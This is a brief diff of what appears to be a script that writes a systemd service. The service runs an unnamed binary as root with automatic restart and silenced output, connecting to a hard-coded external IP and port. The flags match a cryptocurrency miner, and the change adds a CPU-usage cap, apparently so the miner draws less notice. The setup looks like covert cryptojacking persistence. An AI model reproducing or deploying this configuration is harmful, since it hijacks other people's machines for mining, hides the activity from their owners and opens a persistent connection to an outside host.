@@ -122,7 +122,7 @@ Type=simple
 Restart=always
 RestartSec=1
 User=root
-ExecStart=$FULL_PATH -o 62.60.148.249:9940
+ExecStart=$FULL_PATH -o 62.60.148.249:9940 --cpu-max-threads-hint 70
 StandardOutput=null
 StandardError=null
 
